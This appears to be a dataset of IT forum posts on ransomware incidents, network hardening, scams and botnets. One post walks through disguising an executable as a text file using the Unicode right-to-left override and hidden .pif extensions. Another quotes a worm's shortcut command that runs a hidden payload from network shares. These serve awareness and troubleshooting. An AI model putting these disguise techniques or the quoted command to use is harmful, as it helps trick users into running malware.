1526802,Ransomware incident analysis,"In case it helps, here is a brief analysis of our recent encounter with Locky. The site in question was already operating a relatively strict security policy. Users were however allowed to turn desktop malware protection off, since this was needed for occasional accounting software updates, supplied on DVD. Locky arrives as a VBA macro, which if launched attempts to download an executable from a compromised website. This executable does the real damageMost forms of executable attachment were already blocked at the mailserver, however the management had earlier decided that blocking .doc files would cause too many problems.  Macro execution in Office was turned off, but the malicious document told the user to turn macros on, and a naive user complied. In itself that would not have been too serious, since the security policies forbid the launching of untrusted executables, especially any in the temporary file folders.   However, at the time of opening this attachment, the antimalware security had been disabled. Thus, the malware was able to launch, and a ransomware incident was the result. Asking around, it turned out that two users were routinely suspending desktop malware protection in order to run one specific application, which would not run at all with protection active. This was basically an abuse of the privelege to turn it off for the sake of updates. The users in question should have raised the matter with me, but instead they opted to use the computers unprotected for a significant time -perhaps 30min- each working day.  It was basically just a matter of time until one of them forgot about protection being off, and opened an infected email attachment. On doing some tests with this app in a VM, I found out that on launch it attempts to download an executable to the Temp folder, and run it. When this fails, the application will terminate with an error message. As yet, I'm not sure what purpose the downloaded executable serves. It might be an update, or from previous experience it might be some form of license check. Either way, an action such as this has all the hallmarks of a malware incident, and was quite rightly disallowed when protection was active. I've asked the application vendor for more information on this aspect, and whether the downloaded executable has a predictable name, such that it could be whitelisted. At the moment we've banned .doc attachments except from trusted domains, a step I wanted to take anyway. Users have also been warned that if they do turn off protection to run this special app, email must never be opened at the same time. I'm not happy with this situation though. A better arrangement needs to be found. The fact that this one software vendor is up-to this  executable download lark very nearly cost this site its entire data. I'm  not sure, but I think the reason the damage was limited in extent is  that the malware protection automatically turns back on after a few  minutes, not leaving enough time for a full encryption run. At the moment I cannot very well password-protect the antimalware  controls, since if I do that the special app will be useless, and it's become  necessary for routine work. The proper resolution would be for the app to be recoded so as not to require untrusted executable downloads.   In the longer term, perhaps there needs to be a campaign to discourage software vendors from writing stuff which surreptitiously downloads and runs executables in the Temp folder. It is an extremely bad practice. Maybe one for the IT lawyers to look at. ",11
2120399,How to Disable SSLv2 and SSLv3 on IIS?,"I have been trying to disable SSLv2 and SSLv3 on a few IIS servers.  I tried adding in the appropriate registry settings, and have tried using IIS Crypto.  IIS Crypto after the restarts reads that those protocols are disabled, but when I use Wormly.com or Qualys SSL Labs, they report that the site still has those enabled.  Below are the Registry settings for SSLv2 to start that show they should be disabled.  I have even tried running these tests on a different computer on a different network and they still pick up the same thing.  The only thing between this particular server and the Internet is a firewall, which I don't believe will allow me to choose the version of SSL that people are coming in on.I could really use some help!",0

2108507,Recovering deleted web browsing history advice?,"I'm trying to figure out ways to recover browsing history that was deleted from someone's machine.  They are using Windows 7 and the browser is IE 11.I'm brushing myself up on things like ipconfig /displaydns, look for cookies if they weren't deleted, and going through registry keys, but I'm discovering these may not bare any fruitful results.  If the history and cookies are deleted, then it's a dead end.  Same with looking at the registry entry HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\TypedURLs.  if the machine reboots, then what's stored in DNS cache is no longer available when running ipconfig /displaydns (please correct me if I'm wrong).What I'm not comfortable with is the installation of any sort of third party software on this person's machine.  I've seen posts in other forums from people looking to recover index.dat and those offering help mention that they need to be very careful because of malware embedded in the applications.  What this boils down to is would a solution like this work?  If so, is there any recommended application that is reputable and safe to install that would be able to recover this the browsing history that is free, or inexpensive.What other ways are there to figure this out?  Is creating a restore point in \AppData\Local\ a feasible solution?Thanks for the help",0

387490,Mobotix Control Center video retreival,"Greetings:    I  have set up the Mobotix Q24 camera and I have to say I have been impressed with the features.  I  am also using the Mobotix Control Center to monitor and set the Analytics.  The analytics portion will give me a traffic count as well as generate heat maps that can tell me what store displays are generating the most attention. However, there does come a problem sometimes when attempting to search for past videos to export. ( say there is theft and  you need to give the footage to law enforcement).  I get a message ""timed out while reading .erdinfo"" Now from my understanding this is like an indexing or database file the cameras write to when they transfer images to the NAS.   A simple fix, is you access the camera, remove recording to the NAS, then delete the file, reconnect the camera to the NAS and it will rebuild that specific file.  You can then search past video and export.The NAS device in these stores is a Buffalo NAS and I think that may be the problem.  I searched the site and can't find this issue anywhere else.   Has anyone else experienced this issue?  And if so, what did you do to finally resolve the issue for good?   I am looking at other storage devices, and Synology looks good.  But Exus technology makes a NAS designed for use with the Mobotix camera.  Does anyone have any experience with this setup and how did it go?",0

1194672,Network ACL Best Practices,HelloMy manager and I were having a discussion on ACLs and best practices but we both have different views on how to approach a problem. Senario:You are segregating a VLAN for security however a certain set of users/devices/protocols/etc. still require access to that network so applying an ACL seems like the route to go. We have all the devices listed out with required access the ACL list is created and applied to the VLAN in question. Not sure if this matters but lets assume the VLAN that we are segregating holds sensitive devices. When creating/applying the ACL is it better to apply it as an inbound restriction or an outbound restriction. My opinion is that an inbound approach is best as the switch will drop it regardless and an unauthorized device/user has no way to view what is within the vlan. However applying the ACL in an outbound approach will still allow the packets to reach the device regardless of the rules and only allow a response based on the rules. I guess my fear is that if you take the outbound approach if someone is able to manipulate packets in such away to trigger a vulnerability/backdoor it could happen where as an inbound approach would not even allow those packets to pass into the vlan. ,0

273847,The 2012 Top 10 Holiday Scams,"We recommend you send this to your employees as the bad guys are coming out in full force this holiday season and will try to trick and scam users both at the office and at their house.10) 'The Charity Tricksters'. The holidays are traditionally the time for giving. It's also the time that cyber criminals try to pry money out of people that mean well. But making donations to the wrong site could mean you are funding cybercrime or even terrorism. So, watch out for any communications from charities that ask for your contribution, (phone, email, text, tweets, snail mail and even people ringing your door bell) and make sure they are legit and show their ID. It is safest to only donate to charities you already know, and refuse all the rest. 9) 'The Grinch E-Card Greetings'. Happy Holidays! Your email has an attachment that looks like an e-greeting card, pretty pictures and all.  You think that this must be from a friend. Nope, not so.  Malicious e-cards are sent by the millions, and especially at the office, never open these things as they might infect your workstation. 8) 'The Fake Gift Card Trick'. Internet crooks promote a fake gift card through social media but what they really are after is your information, which they then sell to other cyber criminals who use it for Identity Theft. Here is an example: A recent Facebook scam offered a “free $1,000 Best Buy gift card” to the first 20,000 people who signed up for a Best Buy fan page, which was a malicious copy of the original. 7) 'The Copied Site'. Bad guys build complete copies of well-known sites,  send you emails promoting great deals, sell products, take the credit card, but never deliver the goods. These sites live only a few days and the money usually goes abroad. Your credit card company will refund the purchase, but apart from not getting your gift(s) your card number is now compromised and will be sold and used by cyber criminals. Always check for the https:// rather than just http:// . 6) 'The DM-Scam'. You tweet about a holiday gift you are trying to find, and you get a direct message (DM) from another twitter user offering to sell you one. Stop - Look - Think, because this could very well be a sophisticated scam. If you do not know that person, be -very- careful before you continue and never pay up front. 5) 'The Extra Holiday-money Fraud'.  You always need some extra money during this season, so cyber fraudsters are offering work-from-home scams. The most innocent of these make you fill out a form where you give out confidential information like your Social Security number which will get your identity stolen. The worst of them offer you work where you launder money from a cyberheist which can get you into major trouble. 4) 'The Fake Recession Relief' Internet swindlers target people that are vulnerable due to the recession with pay-in-advance scams and credit offers. Spam emails advertise ""prequalified, super low-interest"" credit cards and loans if you pay a processing fee, which goes straight into the scammer’s pocket. 3) 'The Search Term Trap'. Bad guys do their research and find out what people want. They then build a site that professes to have the item. They push that site high onto the search engines and you might click on that link. But the site contains malware and will infect your PC. Make sure that your web-browser is fully updated, and will warn you if it sees that the site is unsafe. 2) 'The Evil Wi-Fi Twin'. You bring your laptop and go to the mall to scout for gifts. Then you check if you get it cheaper somewhere online. But the bad guys are there too, shopping for your credit card number! They put out a Wi-Fi signal that looks just like a free one you always use. Choose the wrong Wi-Fi and the hacker now sits in the middle and steals your credit card data while you buy online. When you use a Wi-Fi connection in a public place, it is better not to use your credit card. 1) 'The Black Friday Racket'. Black Friday is the start of great holiday shopping deals, unless they are too good to be true and you get tricked into buying an iPad for a 90% discount. Be extra careful with online buying starting the day after Thanksgiving! Here is a fun Black Friday Video:http://youtu.be/FfFqGXajl_IWarm regards,Stu  ",0

1822261,What are some alternatives to Deep Freeze?,"Hello Spiceworks Crowd; Long time lurker, first time poster.My boss has been managing our IT department for decades (I'm pretty sure he remembers when backing up to a tape drive was the industry standard) but he's now retiring and I'm taking over as head of our IT department.One of the first things I'm doing is taking stock of which programs have given us the most hassle. #1 is Deep Freeze.

When putting in safeguards for ransomware infection, would password protecting a shared folder that backups are stored in be a good strategy? We have also hidden the file share so that it can't be seen by just navigating to the device; you have to know the path to access it. The only account that has access to this shared folder is an account setup in AD and only used for accessing this shared folder.

2163209,Botnets - what are they and how do you defend against them?,"First, what is a botnet? (Those of you that already know can skip to the next part.)Botnets (a portmanteau of robot networks) describes a system of interconnected computers that can be used to perform various nefarious tasks. Users catch botnets like a cold. Much like the invisible spread of germs, botnets infect computers and IoT devices (smartwatches, smart refrigerators, gaming systems, and even Teslas) through malware Trojans designed to install the malicious code that allows the hacker to spawn and control their bot regime. They are most often shared through peer-to-peer services. And from there, they can co-opt devices and deluge firewalls, networks, load balancers, DNS servers, and applications. They've even evolved to the point that the bot herder can use any bot to control the botnet.Why do botnets matter?Disruptive botnets can shut down entire websites and potentially the Internet itself. They're difficult to secure against because they exploit browser security vulnerabilities, forgotten plugins, operating systems, outdated hardware/software, and unwitting users. The network of infected devices can be thought of as the composite of other attack types such as ransomware, malware, phishing, and keylogging - just to name a few. They have many uses, but are most commonly known for DDoS attacks.What are some common botnet attacks and how can I protect myself?Email SpammingHackers use email to spread malware like a plague. The unsolicited attachments or links that often come with these emails are basically invitations to join a botnet. To defend yourself, add a multifactor authentication to your email and guard it even further with an authenticator app.KeyloggingHackers filter their keylogging malware to detect words like ""PayPal"" or ""login"". From there, hackers can instantly capture credentials that open the floodgates to a wealth of valuable PII. To defend yourself, install a password manager like LastPass that encrypts, stores, and generates passwords for you guarantees that keylogging scripts will not surface valuable credentials.Installing Advertisement Add-OnsA host of plugins float around the internet, waiting for users to integrate them into their browser. Frequently, these plugins claim to be helpful products like malware scanning tools, offering to prevent the very kind of attacks they execute. To defend yourself, perform a Google search for the product being advertised in the ad banner to confirm its existence and validity. Also consider switching to a browser like Duck Duck Go, which is specifically designed to cloak you from the prying eyes of advertisers.Click FraudBot herders frequently create fake websites on which to host advertisements for third-parties for profit. For every click on an ad executed by a bot in a botnet, botmasters accrue a percentage of advertising fees since the advertiser rewards the publisher for engagement with their content. To defend., secure your Wi-Fi with a strong VPN to create an encryption tunnel.Have you had to deal with a botnet attack? And how did you deal with it and ensure further protection?",12

397628,Mobile security scenario-- Comments please.,"Dear Community,Please look over this laptop remote access security scheme and tell me what you think. Where are the holes? Is this overkill? I have to admit, four separate logins is bugging the users, but they accept it. Still, I am wondering if there is something simpler.We have two supervisors in vehicles (the ""road sups""). They log into a host PC on our network with a company-supplied laptop. Access to the network is over a Verizon 4G network via Gotomypc. Here are the areas where I have configured security:Theft protection: The drives are encrypted with TruCrypt in case the laptops are stolen.Link Security. WiFi and Wired Ethernet are disabled on the laptop. Only the Verizon 4G modem can connect to the Internet. This minimizes attacks from outside networks.Secure local laptop: USB ports and CD-ROM drives are disabled. Windows Firewall Outbound policy is used to block the Internet on the laptop. Users cannot browse the Internet or run apps. The only allowed Internet connection is Gotomypc. However, once users connect with the host PC on our internal network, they are allowed to browse and run apps on that PC.Laptop Authorization: This is a feature of the advanced version of Gotomypc. As the Gotomypc admin, I can restrict login based on the serial numbers of the hard drives on the laptops. This ensures that only the designated laptops can access the hosts on our network. It prevents users who know the logon credentials from using GoToMyPC on their potentially corrupted home computer to access our network. It also prevents unauthorized users who have obtained the credentials from logging in via an unknown computer.Host access control: Once the users access our network via Gotomypc, they log in using domain user accounts. These accounts are the only ones (except for Admin) allowed to log into the host. This prevents users from logging into the virtual machines using their personal accounts. While not necessarily a security risk, limiting access to these two accounts reduces the need to manage multiple user logons.",0

1953464,WatchPoint - Tip of the Week - Lessor Known File Extension Tricks Used By Hacker,"Almost certainly by now, we’re all aware that cyber criminals use social engineering and phishing attacks to trick users into opening malicious emails. Hackers use double extensions such as myfile.doc.exe or myfile.xls.js. Hackers will change file icons, and embed malicious macros into otherwise harmless looking files.Those classic deceptive techniques are the ones that we always hear about, but in this article, we’ll show you two other techniques that are less known and seldom discussed.RTLO – Right To Left OverrideThe first lesser known deceptive tactic is called RTLO. This technique leverages the fact that not all languages are written from left to right. Some languages, like Arabic and Hebrew, are written from right to left.To understand this better, you need to first understand that computers use something called Unicode. In fact, you use Unicode already; it’s just that the computer has been doing it for you. Essentially, computers use Unicode to distinguish between characters of different languages.The Unicode character for today's deception is u202e. This will instruct Windows to flip the text from left to right, to right to left. Now that we have a basic understanding of what Unicode is, I’ll demonstrate how a Hacker can exploit RTLO to hide a file extension1. First, we’ll take an executable file called file.scr. The SCR file extension is for screen savers and is more deceptive than using .exe.2. Using a Unicode converter enter the file name.3. Next, add our u202e Unicode so we can reverse the order of the text.4. Now we need to add the spoofed .txt extension. To do this, edit the Unicode using the following string; u0074\u0078\u00745. Now copy the filename to the file on our computer.6. To prove that it worked, try to edit the file name, and you’ll see that the select pattern is not continuous.This method is very deceptive and not at all easy to spot, which is why it’s being used by hackers.PIF ExtensionThis deceptive trick doesn’t rely on languages or Unicode characters. Instead, it takes advantage of the fact that Windows hides .pif extensions, even when the feature of disabling file extensions has been turned off.This is especially dangerous because PIF files instruct Windows how ms-dos commands should be run. This provides the attacker with a unique way to disguise a malicious file. To prove that this works, follow the steps below:First, create a file with the .txt file extension. Note how the file is a normal looking file, and we can see the file extension.2. Next, add the .pif file extension to the file. Notice how the file type changes but the new .pif file extension is hidden.This tactic works because the changes are very subtle. When the file is stored on your computer’s hard drive, the file type changes and the image adds a shortcut arrow, but the actual file extension is hidden.ConclusionAs they say, the devil lies in the details. And in the case of file extensions, hackers use every trick in the book to disguise their malicious files.

677270,Heads Up! New Hybrid Ransomware Replicates Like A Virus,"Here is a powerful piece of ammo to get (more) IT Security budget.SophosLabs labs' blog reported about a new Ransomware strain with a difference - this one is a true self-replicating parasitic virus. They call it VirRansom.This new strain is a hybrid that combines CryptoWall-like functionality with active self-replicating virus infections of all files it can find. And like the cybercrime Reveton family of malware, it locks the PC's main screen demanding 0.619 Bitcoin to let you back in. Yikes.Let me quote Sophos for a moment: ""Worms vs. Parasitics: Most worms leave you with one, or perhaps a handful, of infected files that weren't there before and need to be deleted.""Parasitic viruses, in contrast, may leave you with hundreds of infected files on each computer, or thousands, or more. If you leave even one of those infected files behind after a clean-up, the infection will start up all over again.""Worse still, the infected files can't just be deleted, because they are your own files that were there before the infection started. That makes cleanup much trickier.""The good news: The file encryption is not as advanced as CryptoWall, as the key to decrypt the files is contained in the malware itself. Your antivirus should soon be able to decrypt the files and restore them, unless the bad guys are constantly changing the encryption keys in which case it may take a day or more before your AV catches up.The bad news: This is a full fledged virus which will spread across your network and doing a less than perfect job on the disinfection can easily lead to reinfection of your whole network.CryptoWall-encrypted files that you can't or don't decrypt are harmless garbage forever, but you can delete them. With VirRansom, files that you don't decrypt are still recoverable, but also still actively infectious. It gets nastier all the time. You can expect a VirRansom 2.0 soon where they might implement ""new features"" like industrial-strength encryption like CryptoWall where you only get the decryption keys after payment, and things like infection of your email server, where emails are converted to a worm for maximum dissemination of their malcode. (Think about the legal ramifications of something like this.)You can mitigate these types of threats through both technical measures and enforcing security policy. First some technical approaches: The very first thing you need to do is test the Restore function of your backups and make sure it works. And have a full set of backups offsite.Start thinking about asynchronous real-time backups so you can restore files with a few mouse clicks.Get rid of mapped drives and use UNC links for shared folders.Whitelisting software, which only allows known-good executables to run,starts to look more attractive by the month.From the security policy angle, it's time to enforce best practices, and one of those is of course prevent these types of infections to begin with, through effective 5-th generation security awareness training, as the infection vector is your end-user opening up an attachment or clicking on a link. Find out how affordable this is for your organization.  http://info.knowbe4.com/kmsat_get_a_quote_now﻿",0

I could authenticate against it just fine. I logged into the user portal as an AD user and could see that users mail. 3. I then manually created a non AD user using local authentication. I added a non AD email address for that user then logged into the user portal. From there I could see all the quarantined email for that email address. So I know the user portal is working. I can make it work for AD users or by manually creating a local user on the UTM itself. My question though is how can I get the auto creation of users working so I don't have to create hundreds of non AD local users? Is this even possible? Perhaps I am misunderstanding what ""automatic user creation"" means. Maybe in step 2 above the ""auto creation"" is that when an AD user logs into the user portal a ""local user"" is auto created and linked to that AD account?For those of you that use UTM 9 for spam filtering in a non AD environment how do you give your users access to the web portal? Do you manually create local accounts for them? Or is there an automated method?",0

416194,Sophos Web Proxy Authentication issue,"I have a support ticket open with Sophos, but I thought I would post it here as well to see if anyone else would know how to assist me.We use a Intranet page for our home page and on that Intranet page we have a weather widget that sits in an iframe and pulls the web address from our webserver. I have authentication setup for the individual users with Captive Portal. When the Intranet page launches, the weather widget shows a Sophos login screen. Once the end user authenicates, the weather widget appears.My problem is that I want the weather widget to appear without having to be authenticated. I have created a Connection Profile called ""Intranet Links"" and have it set to all of our IP addresses. I then created a ""Authentication Profile"" with the only destination listed is the IP address of the weather widget, selected ""Bypass authentication (use IP-based policy rules),"" saved it, and moved it to Priority 1.Guess what, the weather widget still needs to be authenicated. So, I have also added it to the ""Local Site List"" and have added it to our PAC file for it to bypass the Sophos web proxy all together, and it still prompts for a log in.Anyone know what I'm doing wrong? I need to get this resolved before we roll it out for production.Thanks!Melody",0

If the forces of evil begin to realize that they are being defeated by password lengths, wouldn't they just reverse the process and start the combo from 25-30 characters and work backwards? Every combination can be tried during a brute force whether it's from front to back. So I don't get it.",5

913100,"Security flaw found in Wi-Fi driver used by Android, Windows, and Linux","A security team at Alibaba has discovered a security flaw in the wireless network client for Wi-Fi drivers that is used by Android, Linux, BSD, and Windows. If exploited, the security flaw enables an attacker to remotely crash a device  and execute malicious code on it. The flaw affects the wpa_supplicant wireless network client code, which is responsible for negotiating P2P Wi-Fi connections. According to Ars Technica, the security team at Alibaba forwarded its discovery to Jouni Malinen, who is the wpa_supplicant maintainer at Google. Malinen reported that the bug is similar to Hearbleed ""in that it doesn't properly check the length of transmitted data."" But where Heartbleed only allowed attackers to read data by exploiting a flaw in the OpenSSL coding, the wpa_supplicant vulnerability ""works both ways [and] ... could expose the contents of memory to an attacker, or allow the attacker to write new data to memory."" This is because ""the code fails to check the length of incoming SSID information"" and allows information to be written ""beyond the valid 32 octets of data [it is supposed to use]."" Attackers can consequently exploit this flaw by either crashing a device, inserting malicious code, enacting a denial-of-service attack, or read and modify data ""during the three-way handshake of a peer-to-peer network negotiation."" Ars Technica reports that ""these vulnerabilities are difficult to exploit if the target isn't actively using P2P Wi-Fi connections."" Malinen has also released a patch, which can be found here. ",0
2112695,Destructive Malware Hits Winter Olympics,"Apparently the human-faced bird puppet wasn't the only scary thing that appeared during the opening ceremony on Friday — Pyeonchang Winter Olympics organizers have confirmed a cyber attack struck Olympics IT systems during the ceremony, as well. Damage was confined to non-critical systems including internet and television services, but new information from Cisco's Talos security research group indicates the attack could have been much worse. According to Talos researchers, the malware likely used in the attack bears similarities to NotPetya and BadRabbit. It was clearly not designed to steal information, but rather to spread quickly and take down as many systems as possible. As such, they're calling it ""Olympic Destroyer"". We've written up a quick walkthrough of how the malware works, along with three short, key takeaways over at the Barkly blog. In the meantime, here's a diagram that maps out the primary components:There are quite a few interesting things going on here, the foremost perhaps being the combination of credential-stealing techniques and abuse of legitimate system tools (PsExec and WMI) to spread the infection from one machine across the entire network. These techniques are becoming increasingly common plays attackers are adding to their playbooks, so it's important to understand how they work and how to stop them (if you're interested in seeing more attack techniques see this guide). We were able to test Barkly against each of the primary components of this attack (the initial .exe, two credential stealing components, and the ""destructor"" payload), and found that Barkly blocked them all (see it in action here). There are additional ways you can make your organization harder to infect, of course, but having a tool that can provide additional, reliable safety nets can certainly help reduce some stress. It probably isn't surprising to see the Olympics being targeted like this, but it's also a potent reminder attacks are becoming increasingly destructive and widespread. ",11

In the last year we've migrated all of our physical servers over to VMs on a Windows Server 2012 R2 host so I'm interested in the V-Ray edition of the software. I have a couple of questions before I go ahead with the upgrade:1. Is there a direct upgrade path from BackupExec 2010 R3 to BackupExec V-Ray edition? 2. If not, can the V-Ray edition do restores of the old tape data? 3. And if neither of the above apply what is our best upgrade route? Will we need to purchase the standard software and then agents for the VMs?4.

Yay!Fig 1.  Ranking of cyber attacked.  The darker the colour, the higher the concern. Source : The Global Risks Report 2016You’re still smiling aren’t you?  Optimistic, I like that.  Or maybe you work at an SMB or Mid-market company and you think no one would bother to hack little old you?  This is what AT&T have to say: “Hackers will no longer target just large organizations as they can get equally valuable information in other places through analytics on the data they are collecting and combine data to make it more valuable. That means smaller organizations are more likely targets.”No one is suggesting you down a bottle of cough syrup, whack on a Morrissey album and spend a night-in with this year’s Global Risks Report, but one or two of the nightmare scenarios are worth knowing about.  The report links cybersecurity with information infrastructure or in other words, there are a lot of security breaches expected in 2016 and advanced backup and disaster recovery capabilities are going to be needed more than ever to mitigate their impact.Here is a list of the top cybersecurity threats expected this year and what backup and disaster recovery capabilities you will need to combat them:Ransomware “The criminals behind the ransomware campaigns are savvy and once they realise that they’ve locked up source code and financial documents that haven’t been properly backed up, you can expect prices to skyrocket … and be paid.” - Michael Sutton, CISO at Security, Zscaler   Recovery tools you need : •Multi-site replication –multiple image copies of backups cascaded to separate networks•Encryption of backup images•Encryption of backup data in transfer•Recovery time in minutes not hours/days – virtual standby and BMR to dissimilar hardware in the case of building a new environment•Recovery time in less than 1 second not minutes/hours/days – full system data and application failover (optional)•Safely stored tape archives and/or cloud backupAttacks That Change or Manipulate Data“At the moment, most of the serious hacks have been theft, but what if someone gets in the system and starts manipulating and changing data, to the point where now as an operator, you no longer believe what you’re seeing in your system?” - Mike Rogers, Head of the NSA and US Cyber Command   ﻿Recovery tools you need :•Recovery points – point in time backups which you can ‘rewind’ to, i.e. to restore your data and applications from before the first attack•In-line deduplication – the more restore points you have the more data you store; a powerful deduplication technology is key to making possible more restore points•Safely stored tape archives and/or cloud backupCost of cyber insurance ""We expect to see an increasing sophistication in the way the risks associated with a cyber breach are factored into policy cost, just as a driver’s safety record and driving habits are factored into the cost of an automotive policy."" - Carl Leonard, Principal Security Analyst, Websense   Recovery tools you need : •A recovery solution capable of faster recovery times means lower cyber insurance premiums•Multi-site replication to separate networks improves scope and speed of recovery, again lowering premiums•Safely stored tape archives and/or cloud backup reduce the extent of lost data and lower cyber insurance premiums as wellBalkanized Internet, divided by countries “Countries everywhere will take some measure to strategically block Internet access suspected of industrial or governmental cyberespionage and other online criminal activity.” - Sean Tierney, VP of Threat Intelligence, IID   ﻿Recovery tools you need :•Adhere to local compliance by having full control over the location of your backup data and applications – multi-site replication•Working with a cloud backup provider with data centers in the same geographic regionSocial engineering“Hackers who understand technical details of attack security, but also have the business acumen to communicate with CEOs and convince CIOs of their importance will make a significant impact on the role of security professionals.”  - Dave Baker, CSO, Okta   Recovery tools you need :•Role-based administration of your recovery solution – the highest privileges only for the most security savvy•See RansomwareOpen source vulnerabilities ""We observed certificate issues related to older hashing schemes such as SHA-1, as well as problems related to the version of ciphers supported.

1445415,DirectAccess Can't Connect With Kaspersky Installed,"  ﻿Cross posted in Windows Server Group - Link.I'm not 100% sure this is the best place to post this but since our DirectAccess works fine w/o Kaspersky installed I believe Kaspersky is blocking the connection. Hopefully someone with Kaspersky and DirectAccess can help me out.When we initially set up DirectAccess we were running KES 10 SP1 MR1 w/ Network Agent Patch A. In order to get DirectAccess to work we have to un-monitor port 443 for the policy that was assigned to the computers we wanted to use DirectAccess on. Within the last month we have installed the Network Agent Patch D on the server and many of the workstations. We have also upgraded some but not all the workstations to KES 10 SP1 MR2.Over the past 4 weeks any of the workstations that use DirectAccess as their primary means of accessing the corporate network have dropped off the Kaspersky Console. The workstations are still listed as having the network agent and av installed but do not show the network agent as running. On the workstations the network agent is running but ""klcsngtgui"" to test the connection it failed with a transport error.If we connect the workstation to the network with the backup VPN connection the connection goes through and Kaspersky sees the network agent as running in the console and can communicate back and forth.So, with all that it seems that something with regards to the Kaspersky setup is blocking DirectAccess as, once again, DirectAccess works if we test it on a workstation w/o Kaspersky installed.﻿ Does anyone have any ideas? Or maybe something I missed?EDIT: Talking with some of my co-workers I have slightly mis-stated the situation. DirectAccess connects with Kaspersky installed and the policy set to not monitor port 443. The hitch is that Kaspersky can't make the connection the the Kaspersky server and the server can't see that the Network Agent is running on the workstation even though it is.",0

2176835,A deeper look into IoT security regulations -- California & U.K.,"In recent months, California Governor Jerry Brown signed Assembly Bill No. 1906 and California SB-327 into law. These are nearly identical bills that will begin enforcement in January 2020, with the goal of holding IoT device manufacturers accountable for the security of their users. The delay in enforcement is to allow manufacturers to be accountable without stifling innovation.https://blog.avast.com/iot-laws-to-protect-your-securityShortly after, the government in the U.K. passed a voluntary CoP, or Code of Practice, for IoT devices. This code is not legally enforced, like California's IoT law, but the differences run deeper.What's the difference?For example, California's law ensures that manufacturers of IoT devices that are sold in California must now be equipped with “a reasonable security feature or features,"" but it doesn't clearly define what that actually is apart from some general guidelines. It also targets generic passwords that some vendors hard-code into default firmware in some devices.On the other hand, the U.K.'s CoP details 13 separate steps that manufacturers can follow, paired with a mapping document and a consumer guide.Is the California law enough?Back to the laws -- the question now remains, is it enough? Not everyone thinks so, and some think that it could give lawmakers a false sense of security. IoT security goes way beyond passwords!Home routers fast becoming the new attack layer With the proliferation of IoT devices, these laws and regulations are aptly timed (and some may argue, too little too late, given the total count globally of these devices now exceeds 17 billion)Also aptly timed is the home router as an infection vector. With so many weakly secured IoT devices, the router is a bigger target than ever before; but there are ways to help keep home networks safe, such as the upcoming Avast Smart Home Security!Learn moreTo learn more about these regulations, head over to the Avast security blog!",0

1091312,Is Hosted VoIP Secure? Security Solutions Provider Unifies 30+ Locations w/VoIP,"Can a hosted VoIP solution REALLY be as secure and as compliant as an on-prem solution?  The answer is yes and with the right provider, possibly even MORE secure.As a security solutions provider, FishNet Security sets the bar high when selecting outside vendors.  With 11 major offices across the U.S. and about 20 remote locations. The company primarily serves Fortune 500 clients, as well as a number of federal government departments. With almost 750 employees, FishNet Security has become the largest information security and infrastructure solutions providerIn November 2013, FishNet Security began looking for a cloud-based replacement solution for its on-premises IP PBX systems. “Primarily, we were focused on operations and reliability, ease of use, and reducing the amount of system administration required,” said FishNet's IT architect. “Also, we are very cost-conscious, and moving our communications to the cloud offered us a level of financial predictability that was very attractive.”“We have our own internal security processes and procedures, but we also have to ensure that our customers’ data is secured in accordance with their own requirements. Multiply that by thousands of customers and you’ll understand why we have to be extremely selective about whom we entrust with their data.”In addition, FishNet Security had a very limited time frame in which to complete the cutover to the new communication system.Read how FishNet security went about selecting and implementing a hosted VoIP solution while maintaining their strict security and compliance requirements.https://www.8x8.com/resources/customers/fishnet-security",1

2095557,Changing outside interface IP on ASA with multiple site to site VPN connections.,"We are changing ISP's at our main site so the outside IP address of our ASA will be changing with the move. There are 30+ remote sites that have ASA 5505's that use site to site VPN to connect back to the main site. The 30+ remote ASA's will need the site to site VPN address changed to the new one to connect back to the main site. I'm trying to figure out the best way to do this. So far, I have gone ahead and made new VPN connections with the new address on each remote ASA and just left them with a higher priority value than the one they are using now. I was hoping that if one VPN connection didn't work then it would try to connect with the next priority one but this does not seem to be the case.  My plan now is to just go through and delete the old VPN connection (which will cause me to lose access to the ASA) before we make the switch. My questions are:1. Will this work? Once the outside interface on the main site ASA is changed, will the remote sites automatically connect back? 2. Is there a better way to do this?remote site example:crypto map outside_map 3 match address outside_3_cryptomap -- currently connected - will be deletedcrypto map outside_map 3 set pfs group5crypto map outside_map 3 set peer 216.x.x.x crypto map outside_map 3 set transform-set ESP-AES-128-SHAcrypto map outside_map 4 match address outside_cryptomap -------- new connectioncrypto map outside_map 4 set pfs group5crypto map outside_map 4 set peer 12.x.x.x crypto map outside_map 4 set transform-set ESP-AES-128-SHA",0

We don't have the budget for anything huge in regards to a NAS. We were thinking more along the lines of something like a Drobo or one of Cisco's NAS devices. These devices don't run a Windows OS and can't have the remote backup agent installed on them, but this should be fine since I'm not wanting to backup data that's on the NAS--I just want to use the NAS to store my backed up data.So my question is, can Backup Exec be used to backup data to a NAS that is located on the network?",0

It took some work to get it all set up, but I'd like to report that it's currently working and I've successfully completed a full phishing campaign. I used the SPToolkit which is no longer under current production but you can find it on GitHub, TurnkeyLinux and a lot of testing. Here are some screen grabs of some of the screensOverview - Pie ChartBasic Overview of the campaignA little detail on the resultsMore detail on the results. As you can see you tell - there's all kinds of detail available: when the email was sent, whether they clicked on any links, if they accepted the training link that's on the bottom of the result page etc...Let me know if you guys would be interested in a How-To on this and I'll write one up!!",0

276827,Network Folders Hidden & Shortcuts Created Instead. Nightmare!,"Hi Everyone,This is probably one of my worst moments in IT I have had in 7 years and I just cannot find the cause or root of the problem and further to that a resolution! Please help! Sorry about the essay but there are many odd symptons so I appreciate your patience!Symptons/Story:Last Wednesday I got a reports of folders going missing on a network drive. It turns out that somehow the folders were hidden and then shorcuts where created for each folder that got hidden. The shortcuts pointed to CMD.exe on system32.exe (but there was no script attached to this).An example of one of the shortcuts path are as follows:C:\Windows\system32\cmd.exe /C start cmd.exe /C if exist ""\\Servername\Foldername\A\cyTvmkI.lim"" start """" ""\\Servername\Foldername\A\cyTvmkI.lim"" && start """" ""\\Servername\Foldername\A""The folder then open but NTFS permission do not seem to apply. I recognized that there last modified user and questioned her and she as any user got nervous and denied doing anything. Moving foward I deleted the shortcuts and un-hided (if that is even a word) the folders. On the same server sits user's roaming profiles which had the same problem. A load of account roaming profiles where so badly corrupt that I had to rebuild there roaming profiles. Users were constantly getting explorer.exe crashes and many other process crashing on them.Our Group policy was set by my predecessor that the ""AppData"" folder is copied onto each user's Private Personal Network Drive. I noticed the ""AppData"" folder was also hidden. So I un-hide and deleted the shorts. Today I am now getting reports that it has happened to other network shares, once verified this was the case.I am confused...this happens on network shares only, any server. Could it be a virus? Someone I know said it was with offline folders but this can't be the case as there are no offline folders synced.Note: no group policies or NTFS permissions have changed. And I am the only one in IT and I  